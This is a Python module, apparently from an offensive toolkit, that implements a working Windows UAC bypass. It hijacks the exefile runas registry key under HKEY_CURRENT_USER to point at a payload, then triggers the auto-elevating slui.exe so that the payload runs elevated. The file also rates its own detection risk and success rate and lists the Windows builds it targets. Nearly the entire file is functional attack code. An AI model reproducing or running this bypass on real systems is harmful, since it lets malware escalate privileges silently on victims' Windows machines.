"""
Slui UAC Bypass Module
Bypasses UAC using slui.exe registry hijacking.

How it works:
1. slui.exe (Windows Activation) auto-elevates
2. Exploits registry key hijacking via exefile runas
3. When slui runs with file association, payload executes

Works on: Windows 8/10 (older builds)
"""

from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import UACBypassBase

try:
    import winreg

    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False


class SluiBypass(UACBypassBase):
    """UAC bypass using slui.exe."""

    METHOD_NAME = "slui"
    DESCRIPTION = "Slui.exe UAC bypass (Windows 8/10)"
    MIN_VERSION = 8
    MAX_BUILD = 17763  # Works up to 1809
    DETECTION_RISK = "Medium"
    SUCCESS_RATE = 0.70

    # Registry path
    REG_PATH = r'Software\Classes\exefile\shell\runas\command'

    # Slui executable path
    SLUI_PATH = r'C:\Windows\System32\slui.exe'

    def __init__(self, output_dir: str = "uac_bypasses", verbose: bool = False):
        """
        Initialize the slui bypass.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)
        self.log("Slui bypass module initialized", "SUCCESS")

    def bypass(self, payload_path: str) -> bool:
        """
        Execute slui UAC bypass.

        Args:
            payload_path: Path to payload executable

        Returns:
            True if successful, False otherwise
        """
        if not WINDOWS_AVAILABLE:
            self.log("Windows registry not available", "ERROR")
            return False

        self.log("Configuring registry for slui bypass...", "INFO")

        try:
            # Create registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)

            # Set default value to payload path
            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, payload_path)

            # Set IsolatedCommand
            winreg.SetValueEx(key, 'IsolatedCommand', 0, winreg.REG_SZ, payload_path)

            winreg.CloseKey(key)

            # Track for cleanup
            self.modified_registry.append(
                (winreg.HKEY_CURRENT_USER, self.REG_PATH, '')
            )

            self.log("Registry configured successfully", "SUCCESS")

            # Execute slui
            self.log("Triggering slui.exe...", "INFO")

            success = self.execute_process(self.SLUI_PATH, wait=False, timeout=3)

            return success

        except Exception as e:
            self.log(f"Slui bypass failed: {e}", "ERROR")
            return False


if __name__ == "__main__":
    bypass = SluiBypass(verbose=True)
    print(f"\nMethod: {bypass.METHOD_NAME}")
    print(f"Description: {bypass.DESCRIPTION}")
    print(f"Success Rate: {bypass.SUCCESS_RATE * 100:.0f}%")